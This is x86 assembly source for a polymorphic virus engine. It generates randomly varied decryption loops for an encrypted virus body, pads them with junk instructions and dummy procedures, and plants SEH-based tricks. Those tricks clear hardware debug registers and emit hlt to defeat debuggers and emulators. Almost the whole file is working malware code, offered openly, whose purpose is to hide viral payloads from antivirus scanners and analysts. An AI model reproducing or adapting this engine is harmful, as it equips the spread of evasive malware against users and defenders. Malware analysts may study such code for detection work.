COMMENT *
random reg generator
do not use esp regs 3 used -> 3 junk generated
generate poly:
                     mov           regbase, ebx                ;can be push/pop also
                     mov           regcount, virus_size
                     shr           regcount, 2                 ;divide by 4
                     mov           regkey, KEY                 ;generated randomly
__poly:              add           [regbase], regkey
                     rol           [regbase], 16
                     xor           [regbase], regkey
                     sub           regcount, 4
                     test          regcount, regcount
                     jnz           __poly
                   

junk opcodes are inserted between.
junk procedures are here also -> 3 predefined - 1 randomly generated
SEH -> SEH that will blow up hardware breakpoints.
       - basicaly trough SEH you are able to manipulate with thread
        CONTEXT so we can use this against hardware breakpoints.
        - Install SEH
        - cause exception
        - get context
        - zero CONTEXT_Dr0/Dr3
        - continue execution
     - this block also generates hlt instruction if code ain't emulated
       in right way =)
       
                                          deroko <deroko<at>gmail<dot>com>
                                          http://deroko.headcoders.net
*

.586p 
.model flat, stdcall
jumps
locals

pushreg              equ           50h
popreg               equ           58h
movregreg            equ           08Bh                 ;+modrm
movregimm            equ           0B8h                 ;+imm32
shrregimm            equ           0E8C1h               ;+imm8
addmemreg            equ           01h                  ;+modrm 
addregimm8           equ           83h                  ;+modrm (11000 reg) + imm8
rolmemimm            equ           000C1h               ;+imm8 (16 in this case)
xormemreg            equ           0031h                ;+modrm
addregimm            equ           83C0h                ;+imm8 
xchgreg              equ           87h                  ;+modrm
testregreg           equ           85h                  ;+modrm
orregreg             equ           0Bh                  ;+modrm
jnz8                 equ           75h                  ;imm8
jnz32                equ           850Fh                ;imm32
jz8                  equ           74h                  ;imm8
decreg               equ           48h                  ;size1
fninitopcode         equ           0E3DBh
fnopopcode           equ           0D0D9h
subregreg            equ           2Bh                  ;+modrm
addregreg            equ           03h                  ;+modrm
notreg               equ           0D0F7h               ;not reg (change modrm - ah)
negreg               equ           0D8F7h               ;neg reg (change modrm - ah)
xorregreg            equ           33h                  ;+modrm
andregreg            equ           23h                  ;+modrm 
filddisp8            equ           40DBh                ;40(modrm) + disp8
fiadddisp8           equ           40DAh                ;40(modrm) + disp8
fisubdisp8           equ           60DAh                ;60(modrm) + disp8
fimuldisp8           equ           48DAh                ;48(modrm) + disp8
fsqrtopcode          equ           0FAD9h               ;plain instr
f2xm1opcode          equ           0F0D9h               ;plain instr
fyl2xopcode          equ           0F1D9h               ;plain instr
fxchopcode           equ           0C9D9h               ;plain instr

.data
                     dd            ?

.code
__start:             
                     db            "poly",0
;input:
;      arg1 = virus_va
;      arg2 = virus_size
;      arg3 = where to generate poly
;      arg4 = krypt key (32bit)
;output: none
generatepoly:
arg1                 equ           dword ptr[esp+8*4+4]
arg2                 equ           dword ptr[esp+8*4+8]
arg3                 equ           dword ptr[esp+8*4+12]
arg4                 equ           dword ptr[esp+8*4+16]
                     pushad
                     jmp           __table
__goback:            pop           ebp
                     mov           edi, ebp
                     mov           ecx, 36
                     xor           eax, eax
                     rep           stosb                                ;zero table
                     
                     lea           edi, randomseed
                     call          __randomize
                     
                     mov           edi, arg4
                     mov           cryptkey, edi
                     mov           edi, arg1
                     mov           virus_va, edi
                     mov           edi, arg3
                     mov           poly_start, edi
                     mov           ecx, arg2
                     mov           virus_size, ecx
                     
                     call          getrandomregs
                     call          genprolog
                     call          genseh
                     call          gengarbageproc
                     call          gengarbage
                     call          gendummyproc
                     call          gengarbageproc
                     call          gendecrypt
                     call          gengarbageproc
                     call          genseh
                     mov           al, 0C3h
                     stosb
                     mov           ax, jnz32
                     stosw
                     mov           edx, 200h
                     call          random
                     mov           edx, jmpback
                     sub           edx, edi
                     sub           edx, eax
                     xchg          eax, edx
                     stosd                   
                     call          gengarbage
                     mov           al, 0C3h
                     stosb
                     popad
                     ret           16


genprolog:           
                     call          genjmp
                     call          gengarbage
                     call          yesno
                     test          eax, eax
                     jz            __0
                     call          gengarbage
__0:
                     call          genjmp 
                     mov           al, movregimm
                     add           al, regbase
                     stosb
                     mov           prologset, 1
                     mov           eax, virus_va
                     stosd
                     call          yesno
                     test          eax, eax
                     jz            __1
                     call          gengarbage
__1:                 call          genjmp    
                     mov           al, movregimm
                     add           al, regcount
                     stosb
                     mov           eax, virus_size
                     stosd
                     call          yesno
                     test          eax, eax
                     jz            __2
                     call          gengarbage
__2:                 call          genjmp    
                     mov           ax, shrregimm
                     add           ah, regcount
                     stosw
                     mov           al, 2
                     stosb
                     call          yesno
                     test          eax, eax
                     jz            __3
                     call          gengarbage
__3:                 call          genjmp
                     mov           al, movregimm
                     add           al, regkey
                     stosb
                     mov           eax, cryptkey
                     stosd
                     ret

gendecrypt:
;__poly:              add           [regbase], regkey
;                     rol           [regbase], 16
;                     xor           [regbase], regkey
;                     sub           regcount, 4
;                     test          regcount, regcount
;                     jnz           __poly
;                     pop           ebx  
                     mov           jmpback, edi
                     
                     call          gengarbage
                     call          genjmp
                     mov           al, addmemreg
                     stosb         
                     mov           dl, regkey
                     shl           dl, 3
                     mov           al, regbase            
                     add           al, dl
                     stosb
                     
                     call          gengarbage
                     call          gengarbageproc
                     ;----------gen rol mem 16
                     call          genjmp
                     mov           ax, rolmemimm
                     add           ah, regbase
                     stosw
                     mov           al, 16
                     stosb
                     
                     call          gengarbage
                     call          gengarbageproc
                     call          genjmp
                     ;----------gen xor mem, reg
                     xor           eax, eax
                     mov           ax, xormemreg
                     mov           dl, regkey
                     shl           dl, 3
                     mov           ah, regbase
                     add           ah, dl
                     stosw
                     
                     call          gengarbage
                     call          genjmp
                     ;----------add reg base + 4
                     mov           al, addregimm8
                     stosb
                     mov           al, 11000000b
                     add           al, regbase
                     stosb
                     mov           al, 4
                     stosb
                     
                     call          gengarbage
                     call          genjmp
                     ;----------generate dec regcount
                     mov           al, decreg
                     add           al, regcount
                     stosb
                     ;----------generate test/or regcount/regcount
                     mov           al, testregreg
                     stosb
                     mov           al, regcount
                     shl           al, 3
                     add           al, regcount
                     add           al, 11000000b
                     stosb
                     ;no garbage here!!!                     
                     ;----------generate jnz backward
                     mov           ax, jnz32
                     stosw
                     mov           eax, jmpback
                     sub           eax, edi
                     sub           eax, 4
                     stosd
                     ret
                     
gengarbage:                    
                     
                     call          yesno
                     test          eax, eax
                     jz            __g0
                     mov           al, pushreg
                     add           al, junk1
                     stosb
                     mov           al, popreg
                     add           al, junk2
                     stosb
__g0:                call          genjmp
                     call          yesno
                     test          eax, eax
                     jz            __g1
                     mov           ah, junk2
                     shl           ah, 3
                     add           ah, junk3
                     add           ah, 11000000b
                     stosw
__g1:                call          genjmp     
                     call          yesno
                     test          eax, eax
                     jz            __g2
                     call          yesno
                     test          eax, eax             ;use or/test
                     jz            __g_or
                     mov           al, testregreg
                     jmp           __g_skip0
__g_or:              mov           al, orregreg
__g_skip0:           
                     mov           ah, junk3
                     shl           ah, 3
                     add           ah, junk1
                     add           ah, 11000000b
                     stosw
                     xor           eax, eax
                     call          yesno                ;use jz8 or jnz8
                     test          eax, eax
                     jz            __g_jz
                     mov           al, jnz8
                     jmp           __gstosw
__g_jz:              mov           al, jz8
__gstosw:            stosw                                                      
__g2:                call          yesno
                     test          eax, eax
                     jz            __g3
                     cmp           fpuset, 0
                     jne           __skip_fnop
                     mov           ax, fninitopcode
                     stosw
                     mov           fpuset, 1
                     
__skip_fnop:         call          yesno
                     test          eax, eax
                     jz            __g3
                     cmp           fpuset, 0
                     jz            __g3
                     mov           ax, fnopopcode
                     stosw
__g3:                call          genjmp
                     call          yesno
                     test          eax, eax
                     jz            __g4
                     mov           al, subregreg
                     
                     mov           ah, junk2
                     shl           ah, 3
                     add           ah, junk1
                     add           ah, 11000000b
                     stosw
__g4:                call          yesno
                     test          eax, eax
                     jz            __g5
                     
                     mov           ah, junk3
                     shl           ah, 3
                     add           ah, junk2
                     add           ah, 11000000b
                     stosw
__g5:                call          yesno
                     test          eax, eax
                     jz            __g6
                     mov           ax, negreg
                     add           ah, junk3
                     stosw
__g6:                call          yesno
                     test          eax, eax
                     jz            __g7
                     mov           ax, notreg
                     add           ah, junk2
                     stosw
__g7:                call          yesno
                     test          eax, eax
                     jz            __g8
                     mov           al, xorregreg
                     
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, junk2
                     add           ah, 11000000b
                     stosw
__g8:                call          yesno
                     test          eax, eax
                     jz            __g_fpu1
                     mov           al, andregreg
                     mov           ah, junk2
                     shl           ah, 3
                     add           ah, junk3
                     add           ah, 11000000b
                     stosw
__g_fpu1:            cmp           fpuset, 0
                     je            __skip_fpu_g
                     cmp           prologset, 1
                     jne           __skip_fpu_g
                     call          yesno
                     test          eax, eax
                     jz            __g_fpu2
                     mov           ax, filddisp8
                     add           ah, regbase
                     stosw
                     mov           edx, 20h
                     call          random
                     stosb                                     ;store random displacement 0 ~ 31
__g_fpu2:            call          genjmp
                     call          yesno
                     test          eax, eax
                     jz            __g_fpu3
                     mov           ax, fiadddisp8
                     add           ah, regbase
                     stosw
                     mov           edx, 20h
                     call          random
                     stosb                              
__g_fpu3:            call          yesno
                     test          eax, eax
                     jz            __g_fpu4
                     mov           ax, fisubdisp8
                     add           ah, regbase
                     stosw
                     mov           edx, 30h
                     call          random
                     stosb
__g_fpu4:                     
__g_fpu6:      
__g_fpu8:            ;call          yesno
                     ;test          eax, eax
                     ;jz            __g_fpu9 
                     ;mov           ax, fxchopcode
                     ;stosw 
__g_fpu9:

                     ;gen          mov    junk3, [regbase+8bit]                     
__skip_fpu_g:        cmp           prologset, 1
                     jne           __exit_g
                     call          yesno
                     test          eax, eax
                     jz            __g_9
                     mov           al, 8Bh
                     mov           ah, junk3
                     shl           ah, 3
                     add           ah, regbase
                     add           ah, 01000000b
                     stosw
                     mov           edx, 60
                     call          random
                     stosb
                     ;gen          add   junk2, [regbase+8bit]
__g_9:               call          yesno
                     test          eax, eax
                     jz            __g_9_insert
                     mov           al, 03h
                     mov           ah, junk2
                     shl           ah, 3
                     add           ah, regbase
                     add           ah, 01000000b
                     stosw
                     mov           edx, 50
                     call          random
                     stosb
__g_9_insert:        call          yesno
                     test          eax, eax
                     jz            __g_10
                     call          selfmody                     
__g_10:              ;gen          sub   junk1, [regabse+8bit]
                     call          yesno
                     test          eax, eax
                     jz            __g_11
                     mov           al, 2Bh
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, regbase
                     add           ah, 01000000b
                     stosw
                     mov           edx, 20h
                     call          random
                     stosb
__g_11:              call          yesno
                     test          eax, eax
                     jz            __g_12
                     mov           al, 33h                     ;xor junk, dword [regbase+8bit]
                     mov           ah, junk2
                     shl           ah, 3
                     add           ah, regbase
                     add           ah, 01000000b
                     stosw
                     mov           edx, 60h
                     call          random
                     stosb
__g_12:              call          genjmp

__g_13:              call          yesno
                     test          eax, eax
                     jz            __g_14
                     mov           al, 23h
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, regbase
                     add           ah, 01000000b
                     stosw
                     mov           edx, 40h
                     call          random
                     inc           eax
                     stosb
__g_14:              call          genjmp      
                     
__exit_g:            ret
;generates ->
;call         __proc
;test         eax, eax
;jz           __skip_proc
;__proc:      push   ebp
;             mov    ebp, esp
;             fninit
;             pop    ebp
;             ret
;__skip_proc:
;or something like that using all regs
genjmp:
                     call          yesno
                     test          eax, eax
                     jz            __g_short
                     ;gnerate jmp 00000001
                     mov           al, 0E9h
                     stosb
                     mov           eax, 1
                     stosd
                     mov           edx, 0FFh
                     call          random
                     stosb
                     jmp           __g_jmp_exit
__g_short:           ;generate jmp short 01
                     mov           al, 0EBh
                     stosb
                     mov           al, 1
                     stosb
                     mov           edx, 0FFh
                     call          random
                     stosb
__g_jmp_exit:        ret

selfmody:
                     mov           al, 0E8h
                     stosb
                     mov           eax, 3
                     stosd
                     mov           al, 0E9h
                     stosb
                     mov           ax, 04EBh
                     stosw
                     mov           edx, 3
                     call          random
                                                       ;chose random reg
                     lea           edx, junk1
                     movzx         edx, byte ptr[edx+eax]
                     mov           al, popreg
                     add           al, dl
                     stosb
                     mov           al, 40h             ;increg
                     add           al, dl
                     stosb
                     mov           al, pushreg
                     add           al, dl
                     stosb
                     mov           al, 0C3h
                     stosb
                     ret          



                     ;db            0E8h, 03, 00, 00, 00
                     ;db            0E9h,                       ;junk jmp 32 
                     ;db            0EBh,04                     ;jmp 4
                     ;db            5Dh                         ;pop reg
                     ;db            45h                         ;inc reg
                     ;db            55h                         ;push  reg
                     ;db            0C3h                        ;ret

gengarbageproc:
                     call          yesno
                     test          eax, eax
                     jz            __gp1
                     mov           al, 0E8h                           ;call 00000002h (skip jmp)
                     stosb
                     mov           eax, 2
                     stosd
                     mov           ax, 07EBh                          ;jmp after call
                     stosw
                     mov           al, 55h                            ;push ebp
                     stosb
                     mov           eax, 0E3DBEC8Bh                    ;mov ebp, esp, fninit
                     stosd
                     mov           ax, 0C35Dh                         ;pop ebp/ret
                     stosw                                         
                     jmp           __exitgenproc
                     
__gp1:               call          yesno
                     test          eax, eax
                     jz            __gp2
                     mov           al, 0E8h
                     stosb
                     mov           eax, 2
                     stosd
                     mov           ax, 0AEBh
                     stosw
                     mov           al, 60h
                     stosb
                     mov           eax, 0D12BC333h
                     stosd
                     mov           eax, 6193C38Bh
                     stosd
                     mov           al, 0C3h
                     stosb
                     jmp           __exitgenproc
                      
__gp2:               call          yesno
                     test          eax, eax
                     jz            __gp3
                     mov           al, 0E8h
                     stosb
                     mov           eax, 2
                     stosd
                     mov           eax, 525010EBh
                     stosd
                     mov           ax, 0C069h
                     stosw
                     mov           eax, 90h
                     stosd
                     mov           al, 2Dh
                     stosb
                     mov           eax, 0deadbeefh
                     stosd
                     mov           ax, 585Ah
                     stosw
                     mov           al, 0C3h
                     stosb
__gp3:              
__exitgenproc:       ret
                                                                 
;to use garbage/or not!?!?
;eax = 1 yes
;eax = 0 no                     
yesno:
                     lea           eax, randomseed
                     mov           edx, 10
                     call          __random
                     cmp           eax, 5
                     jbe           __yes
                     mov           eax, 0
                     jmp           __ret_yesno
__yes:               mov           eax, 1           
__ret_yesno:         ret                     

;edx has range
random:
                     lea           eax, randomseed
                     call          __random
                     ret
  
;genrates seh, random regs used, generates exception, clears debug regs
;use junk2/junk3/junk1
genseh:
                     mov           al, 0E8h
                     stosb
                     mov           eax, 1Ch
                     stosd
                     ;mov reg, [esp+c] (junk3)
                     mov           al, 8Bh
                     mov           ah, junk3
                     shl           ah, 3
                     add           ah, 01000100b
                     stosw
                     mov           ax, 0C24h
                     stosw
                     ;xor          reg/reg (junk1)
                     mov           al, 33h
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, junk1
                     add           ah, 11000000b
                     stosw
                     call          yesno ;depends if we are gona use and or mov
                     test          eax, eax
                     jz            __g_use_and
                     mov           dl, 89h              ;and to reg2
                     jmp           __skip0_g_seh
__g_use_and:         mov           dl, 21h
__skip0_g_seh:       ;gen          mov/and [junk3+4], junk1
                     mov           al, dl
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, junk3
                     add           ah, 01000000b
                     stosw
                     mov           al, 04
                     stosb
                     ;same shit again
                     mov           al, dl
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, junk3
                     add           ah, 01000000b
                     stosw
                     mov           al, 08h
                     stosb
                     ;again the same
                     mov           al, dl
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, junk3
                     add           ah, 01000000b
                     stosw
                     mov           al, 0Ch
                     stosb
                     ;again same shit
                     mov           al, dl
                     mov           ah, junk1
                     shl           ah, 3
                     add           ah, junk3
                     add           ah, 01000000b
                     stosw
                     mov           al, 10h
                     stosb
                     ;gen          add    [junk3+B8h], 5
                     mov           al, 83h
                     mov           ah, junk3
                     add           ah, 10000000b
                     stosw
                     mov           eax, 0B8h
                     stosd
                     mov           al, 5
                     stosb
                     
                     ;gen          xor eax, eax
                     mov           ax, 0C033h
                     stosw
                     ;ret
                     mov           al, 0C3h
                     stosb
                     ;gen          xor reg/reg
                     mov           al, 33h
                     mov           ah, junk2
                     shl           ah, 3
                     add           ah, junk2
                     add           ah, 11000000b
                     stosw
                     ;push         dword ptr FS:[reg]
                     mov           al, 64h
                     stosb
                     mov           al, 0FFh
                     mov           ah, 30h
                     add           ah, junk2
                     stosw
                     ;mov          dword ptrFS:[reg], esp
                     mov           al, 64h
                     stosb
                     mov           al, 89h
                     mov           ah, 20h
                     add           ah, junk2
                     stosw
                     ;inc          dword ptr[reg] ;reg is 0 <acess violation>
                     mov           al, 0FFh
                     mov           ah, junk2
                     stosw
                     ;jmp          tu full AVs if SEH is not emulated in right way
                     mov           ax, 0D3EBh
                     stosw  
                     ;hlt          and again if jmp is not followed, execute hlt instruction
                     mov           al, 0F4h
                     stosb
                     ;pop          dword ptr FS:[reg]
                     mov           al, 64h
                     stosb
                     mov           al, 8Fh
                     mov           ah, junk2
                     stosw
                     ;add          esp, 4 align stack
                     mov           ax, 0C483h
                     stosw
                     mov           al, 4
                     stosb
                     ret

gendummyproc:
                     mov           al, 0E8h
                     stosb
                     mov           eax, 05
                     stosd
                     mov           al, 0E9h
                     stosb
                     mov           dummyjmp, edi
                     stosd         ;patch this latter
                     call          gengarbage
                     call          genseh                      ;yeah SEH again =)
                     call          gengarbage
                     mov           al, 0C3h
                     stosb
                     push          edi
                     mov           eax, edi
                     sub           eax, dummyjmp
                     sub           eax, 4
                     mov           edi, dummyjmp
                     stosd
                     pop           edi
                     ret
                     

getrandomregs:
__spin_1st:          lea           eax, randomseed
                     mov           edx, 8
                     call          __random
                     cmp           eax, 04                     ;esp
                     je            __spin_1st
                     cmp           eax, 05                     ;ebp, avoid SIB
                     je            __spin_1st
                     mov           regbase, al
__spin_2nd:          lea           eax, randomseed
                     mov           edx, 8
                     call          __random
                     cmp           eax, 04
                     je            __spin_2nd
                     cmp           regbase, al
                     je            __spin_2nd
                     mov           regkey, al
__spin_3rd:          lea           eax, randomseed
                     mov           edx, 8
                     call          __random
                     cmp           eax, 4
                     je            __spin_3rd
                     cmp           regbase, al
                     je            __spin_3rd
                     cmp           regkey, al
                     je            __spin_3rd
                     mov           regcount, al
                     
                     mov           ecx, 7
                     mov           junk1, 0
                     mov           junk2, 0
                     mov           junk3, 0
__junk_reg:          
                     cmp           cl, regcount
                     je            __next
                     cmp           cl, regbase
                     je            __next
                     cmp           cl, regkey
                     je            __next
                     cmp           cl, 04                            ;esp
                     je            __next
                     cmp           cl, 05
                     je            __next                             ;ebp (b/c of SIB byte)
                     cmp           cl, junk1
                     je            __next
                     cmp           junk1, 0
                     jne           __junk2
                     mov           junk1, cl
                     jmp           __next
__junk2:             cmp           junk2, 0
                     jne           __junk3
                     mov           junk2, cl
                     jmp           __next
__junk3:             mov           junk3, cl
__next:              loop          __junk_reg
                     ret

;pker's Random Number Generator (PKRNG)
__randomize:         pushad
                     db            0fh,31h                 ; RDTSC
                     add           eax,edx                 ; ...
                     stosd                           ; fill in the seed buffer
                     popad
                     ret
__random:            pushad
                     xchg          ecx,edx
                     mov           edi,eax
                     mov           esi,eax
                     lodsd                                 ; get the previous seed value
                     mov           ebx,eax
                     mov           ebp,ebx
                     call          __m_seq_gen             ; generate a m-sequence
                     imul          ebp                     ; multiply with the previous seed
                     xchg          ebx,eax
                     call          __m_seq_gen             ; generate anothe m-sequence
                     add           eax,ebx                 ; to make noise...
                     add           eax,92151fech           ; and some noisez...
                     stosd                                 ; write new seed value
                     xor           edx,edx
                     div           ecx                     ; calculate the random number
                     mov           [esp+28],edx            ; according to a specified range
                     popad
                     ret
__m_seq_gen:         pushad
                     xor           esi,esi                 ; use to save the 32bit m-sequence
                     push          32                      ; loop 32 times (but it's not a
                     pop           ecx                     ; cycle in the m-sequence generator)
msg_next_bit:        mov           ebx,eax
                     mov           ebp,ebx
                     xor           edx,edx
                     inc           edx
                     and           ebp,edx                 ; get the lowest bit
                     dec           cl
                     shl           ebp,cl
                     or            esi,ebp                 ; output...
                     inc           cl
                     and           ebx,80000001h           ; \
                     ror           bx,1                    ;  \
                     mov           edx,ebx                 ;   \
                     ror           ebx,16                  ;    module 2 addition
                     xor           bx,dx                   ;   /
                     rcl           ebx,17                  ;  /
                     rcr           eax,1                   ; /
                     loop          msg_next_bit
                     mov           [esp+28],esi
                     popad
                     ret

                                     
__table:             call          __goback
data                 label         byte
                     db            0             ;regbase
                     db            0             ;regkey
                     db            0             ;regcount
                     db            0             ;junk1
                     db            0             ;junk2
                     db            0             ;junk3
                     db            0             ;fpuset
                     db            0             ;prologset
                     
                     dd            0             ;jmpback
                     dd            0             ;randomseed
                     dd            0             ;polystart
                     dd            0             ;virus_va
                     dd            0             ;virus_size
                     dd            0             ;cryptkey
                     dd            0             ;dummyjmp
regbase              equ           byte ptr[ebp]
regkey               equ           byte ptr[ebp+1]
regcount             equ           byte ptr[ebp+2]
junk1                equ           byte ptr[ebp+3]
junk2                equ           byte ptr[ebp+4]
junk3                equ           byte ptr[ebp+5]
fpuset               equ           byte ptr[ebp+6]
prologset            equ           byte ptr[ebp+7]
jmpback              equ           dword ptr[ebp+8]
randomseed           equ           dword ptr[ebp+12]
poly_start           equ           dword ptr[ebp+16]
virus_va             equ           dword ptr[ebp+20]
virus_size           equ           dword ptr[ebp+24]
cryptkey             equ           dword ptr[ebp+28]
dummyjmp             equ           dword ptr[ebp+32]
                     db            "END",0
end                  __start